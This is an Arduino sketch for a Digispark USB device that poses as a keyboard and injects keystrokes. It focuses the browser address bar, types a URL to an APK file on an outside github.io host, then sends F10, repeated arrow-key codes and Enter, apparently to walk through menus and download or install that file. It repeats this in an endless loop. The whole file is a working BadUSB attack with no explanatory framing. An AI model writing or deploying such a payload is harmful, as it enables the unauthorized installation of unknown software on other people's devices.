
#include "DigiKeyboard.h"

void setup() {}

void loop() {
	DigiKeyboard.sendKeyStroke(0);
        DigiKeyboard.sendKeyStroke(MOD_CONTROL_LEFT,KEY_L);
	DigiKeyboard.print("https://vishal-y.github.io/auto-download/1.apk");
	DigiKeyboard.delay(2500);
	DigiKeyboard.sendKeyStroke(KEY_F10);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(81);
	DigiKeyboard.sendKeyStroke(79);
}
